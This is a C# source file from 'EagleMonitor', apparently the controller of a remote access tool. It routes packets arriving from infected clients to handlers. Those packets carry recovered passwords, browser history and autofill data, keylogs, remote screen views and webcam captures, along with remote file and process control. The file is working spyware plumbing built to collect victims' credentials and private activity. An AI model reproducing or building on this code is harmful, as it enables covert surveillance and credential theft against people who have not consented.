using EagleMonitor.PacketParser;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Drawing;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Networking
{
    internal class PacketHandler
    {
        private delegate IPacket PacketParser(IPacket packet, ClientHandler clientHandler);

        private PacketParser packetParser;
        internal PacketHandler(IPacket packet, ClientHandler clientHandler) 
        {
            packetParser = new PacketParser(ParsePacket);
            packetParser.BeginInvoke(packet, clientHandler, new AsyncCallback(Log), null);
        }

        private void Log(IAsyncResult ar)
        {
            IPacket packet = packetParser.EndInvoke(ar);
            Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
            {
                int rowId = Program.logForm.dataGridView1.Rows.Add();
                DataGridViewRow row = Program.logForm.dataGridView1.Rows[rowId];
                row.Cells["Column1"].Value = packet.HWID;
                row.Cells["Column2"].Value = packet.baseIp;
                row.Cells["Column3"].Value = packet.packetType.ToString();
                row.Cells["Column4"].Style.ForeColor = Color.FromArgb(197, 66, 245);
                row.Cells["Column4"].Value = packet.status;
                row.Cells["Column6"].Value = packet.datePacketStatus;

                switch (packet.packetType)
                {
                    case PacketType.FM_DOWNLOAD_FILE:
                        row.Cells["Column5"].Value = ((DownloadFilePacket)packet).fileName;
                        break;

                    case PacketType.FM_DELETE_FILE:
                        if (((DeleteFilePacket)packet).deleted == true)
                            row.Cells["Column5"].Value = ((DeleteFilePacket)packet).path;
                        else
                            row.Cells["Column5"].Value = ((DeleteFilePacket)packet).path + " NOT DELETED";
                        break;

                    case PacketType.FM_START_FILE:
                        row.Cells["Column5"].Value = ((StartFilePacket)packet).filePath;
                        break;

                    case PacketType.FM_GET_FILES_AND_DIRS:
                        row.Cells["Column5"].Value = ((FileManagerPacket)packet).path;
                        break;

                    case PacketType.CONNECTED:
                        row.Cells["Column5"].Value = ((ConnectedPacket)packet).clientStatus;
                        //This provokes key not found in dictionary
                        //ClientHandler.ClientHandlersList[packet.baseIp].clientStatus;
                        break;

                    case PacketType.FM_SHORTCUT_PATH:
                        row.Cells["Column5"].Value = ((ShortCutFileManagersPacket)packet).shortCuts;
                        break;
                }
                Program.logForm.dataGridView1.ClearSelection();
                Program.logForm.dataGridView1.CurrentCell = null;
            }));
        }

        private IPacket ParsePacket(IPacket packet, ClientHandler clientHandler)
        {
            switch (packet.packetType)
            {
                case PacketType.CONNECTED:
                    new ConnectedPacketHandler((ConnectedPacket)packet, clientHandler);
                    break;

                case PacketType.RECOVERY_PASSWORDS:
                    PasswordsPacket pass = (PasswordsPacket)packet;
                    new PasswordsPacketHandler(pass, clientHandler);
                    break;

                case PacketType.RECOVERY_HISTORY:
                    HistoryPacket history = (HistoryPacket)packet;
                    new HistoryPacketHandler(history, clientHandler);
                    break;

                case PacketType.FM_GET_DISK:
                    DiskPacket disk = (DiskPacket)packet;
                    new DisksPacketHandler(disk, clientHandler);
                    break;

                case PacketType.FM_GET_FILES_AND_DIRS:
                    FileManagerPacket fileManagerPacket = (FileManagerPacket)packet;
                    new FileManagerPacketHandler(fileManagerPacket, clientHandler);
                    break;

                case PacketType.FM_DOWNLOAD_FILE:
                    DownloadFilePacket downloadFilePacket = (DownloadFilePacket)packet;
                    new DownloadFilePacketHandler(downloadFilePacket, clientHandler);
                    break;

                case PacketType.FM_DELETE_FILE:
                    DeleteFilePacket deleteFilePacket = (DeleteFilePacket)packet;
                    new DeleteFilePacketHandler(deleteFilePacket, clientHandler);
                    break;

                case PacketType.PM_GET_PROCESSES:
                    ProcessManagerPacket processManagerPacket = (ProcessManagerPacket)packet;
                    new ProcessManagerPacketHandler(processManagerPacket, clientHandler);
                    break;

                case PacketType.PM_KILL_PROCESS:
                    ProcessKillerPacket processKillerPacket = (ProcessKillerPacket)packet;
                    new ProcessKillerPacketHandler(processKillerPacket, clientHandler);
                    break;

                case PacketType.PM_SUSPEND_PROCESS:
                    SuspendProcessPacket suspendProcessPacket = (SuspendProcessPacket)packet;
                    new SuspendProcessPacketHandler(suspendProcessPacket, clientHandler);
                    break;

                case PacketType.PM_RESUME_PROCESS:
                    ResumeProcessPacket resumeProcessPacket = (ResumeProcessPacket)packet;
                    new ResumeProcessPacketHandler(resumeProcessPacket, clientHandler);
                    break;

                case PacketType.KEYLOG_ON:
                    KeylogPacket keylogPacket = (KeylogPacket)packet;
                    new KeylogPacketHandler(keylogPacket, clientHandler);
                    break;

                case PacketType.RM_VIEW_ON:
                    RemoteViewerPacket remoteViewerPacket = (RemoteViewerPacket)packet;
                    new RemoteViewerPacketHandler(remoteViewerPacket, clientHandler);
                    break;

                case PacketType.RC_GET_CAM:
                    RemoteCameraPacket remoteCameraPacket = (RemoteCameraPacket)packet;
                    new RemoteCameraPacketHandler(remoteCameraPacket, clientHandler);
                    break;

                case PacketType.RC_CAPTURE_ON:
                    RemoteCameraCapturePacket RemoteCameraCapturePacket = (RemoteCameraCapturePacket)packet;
                    new RemoteCameraCapturePacketHandler(RemoteCameraCapturePacket, clientHandler);
                    break;

                case PacketType.FM_RENAME_FILE:
                    RenameFilePacket renameFilePacket = (RenameFilePacket)packet;
                    new RenameFilePacketHandler(renameFilePacket, clientHandler);
                    break;

                case PacketType.MISC_INFORMATION:
                    InformationPacket informationPacket = (InformationPacket)packet;
                    new InformationPacketHandler(informationPacket, clientHandler);
                    break;

                case PacketType.FM_SHORTCUT_PATH:
                    ShortCutFileManagersPacket shortCutFileManagersPacket = (ShortCutFileManagersPacket)packet;
                    new ShortCutFileManagersPacketParser(shortCutFileManagersPacket, clientHandler);
                    break;

                case PacketType.KEYLOG_OFFLINE:
                    KeylogOfflinePacket keylogOfflinePacket = (KeylogOfflinePacket)packet;
                    new KeylogOfflinePacketHandler(keylogOfflinePacket, clientHandler);
                    break;

                case PacketType.RECOVERY_AUTOFILL:
                    AutofillPacket autofillPacket = (AutofillPacket)packet;
                    new AutofillPacketParser(autofillPacket, clientHandler);
                    break;

            }
            packet.status = "RECEIVED";
            packet.datePacketStatus = DateTime.Now.ToString();
            return packet;
        }
    }
}
